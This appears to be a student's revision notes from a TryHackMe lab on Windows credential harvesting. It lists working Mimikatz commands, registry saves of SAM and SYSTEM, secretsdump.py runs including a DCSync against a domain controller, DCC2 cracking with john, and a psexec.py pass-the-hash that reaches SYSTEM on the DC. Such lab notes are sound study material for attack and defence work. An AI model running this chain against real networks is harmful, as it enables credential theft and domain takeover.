# 🔄 Credential Harvesting — Complete Workflow

> **Topic:** Credential Harvesting
>
> **Purpose:** Consolidated revision of the credential stores, tools, extraction methods and credential-reuse chain demonstrated in the supplied material.

---

# 🧭 High-Level Workflow

```text
Initial Access
      ↓
Local Administrator
      ↓
Identify Credential Stores
      ↓
┌─────────────────────────────┐
│ LSASS                       │
│ SAM + SYSTEM                │
│ LSA Secrets / Cache         │
│ DPAPI Vault                 │
└─────────────────────────────┘
      ↓
Credential Material
      ↓
Offline Cracking / Reuse
      ↓
Higher-Privilege Account
      ↓
Domain Controller
      ↓
NTDS / DCSync
      ↓
Domain Credential Material
      ↓
Pass-the-Hash
      ↓
SYSTEM
```

---

# 🗃️ Credential Store Decision Map

| Situation | Interesting Store | Main Tool / Method |
|---|---|---|
| Active user sessions | LSASS | Mimikatz |
| Local accounts | SAM + SYSTEM | Mimikatz / SecretsDump |
| Cached domain logons | LSA cache / DCC2 | Mimikatz / SecretsDump |
| Saved application credentials | DPAPI Vault | Mimikatz |
| Domain Controller | NTDS.dit / DRSUAPI | SecretsDump |
| Domain Admin hash obtained | NTLM reuse | Pass-the-Hash |

---

# 1️⃣ LSASS

```text
Live session
   ↓
LSASS
   ↓
NTLM / Kerberos / possible plaintext
```

Mimikatz:

```text
privilege::debug
```

```text
sekurlsa::logonpasswords
```

---

# 2️⃣ SAM + SYSTEM

```text
SAM
 +
SYSTEM
 ↓
Local account hashes
```

Save:

```cmd
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
```

```cmd
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

Extract:

```text
lsadump::sam /sam:"..." /system:"..."
```

---

# 3️⃣ LSA Cache

Elevate:

```text
token::elevate
```

Extract:

```text
lsadump::cache
```

Result:

```text
MSCacheV2 / DCC2
```

These can be cracked offline.

---

# 4️⃣ DPAPI

List Vaults:

```text
vault::list
```

Export accessible credentials:

```text
vault::cred /export
```

Important concept:

```text
Administrator access
       ↓
Access to profile files
       ↓
May access DPAPI material
       ↓
But decryption still depends on the user's cryptographic context
```

---

# 5️⃣ SecretsDump

From an AttackBox:

```bash
secretsdump.py WRK/Administrator:<PASSWORD>@<TARGET_IP> -output local_dump
```

This can expose:

```text
Local SAM
Cached domain credentials
```

---

# 6️⃣ Crack DCC2

Example:

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```text
DCC2
 ↓
Offline cracking
 ↓
Plaintext password
```

---

# 7️⃣ Domain Credential Extraction

After obtaining sufficient domain privileges:

```bash
secretsdump.py TRYHACKME/<USER>:<PASSWORD>@<DC_IP> -just-dc -output dc_dump
```

Conceptually:

```text
DCSync / DRSUAPI
        ↓
Domain credential material
        ↓
NTLM hashes + Kerberos keys
```

---

# 8️⃣ Pass-the-Hash

When an NTLM hash is available:

```bash
psexec.py 'TRYHACKME/Administrator@<DC_IP>' -hashes :<NTLM_HASH>
```

Verify:

```cmd
whoami
```

The supplied lab reaches:

```text
nt authority\system
```

---

# 🧠 Important Distinctions

## NTLM Hash

Can potentially support:

```text
Pass-the-Hash
```

## DCC2 / MSCacheV2

Cannot directly be used for Pass-the-Hash.

Instead:

```text
DCC2
 ↓
Offline cracking
 ↓
Password
```

## Kerberos Keys

Can support Kerberos-based authentication and ticket-related attacks depending on the key and context.

---

# 🎯 Core Learning Chain

The supplied lab demonstrates a progression rather than a single credential-dumping technique:

```text
Local Admin
   ↓
Credential Stores
   ↓
Cached Domain Credential
   ↓
Crack Password
   ↓
Domain User
   ↓
Domain Admin
   ↓
DCSync
   ↓
Domain NTLM Hash
   ↓
Pass-the-Hash
   ↓
SYSTEM on DC
```

---

# ⚠️ Important Security Lesson

A compromised local Administrator account can become significantly more dangerous when privileged domain users have previously authenticated to the workstation.

This creates a potential credential-exposure path:

```text
Privileged User Logs Into Workstation
             ↓
Credential Material Cached / Loaded
             ↓
Local Admin Compromises Workstation
             ↓
Credential Harvesting
             ↓
Domain Privilege Escalation
```

---

# 💡 Key Takeaways

- Credential harvesting is about understanding where authentication material lives.
- Different stores require different privileges and extraction techniques.
- Local Administrator access can expose more than just the local account.
- Cached domain credentials can become a bridge from a workstation to the domain.
- DCC2 must be cracked rather than used directly for Pass-the-Hash.
- Domain-level privileges can enable DCSync-style credential extraction.
- NTLM hashes can enable authentication without recovering the plaintext password.
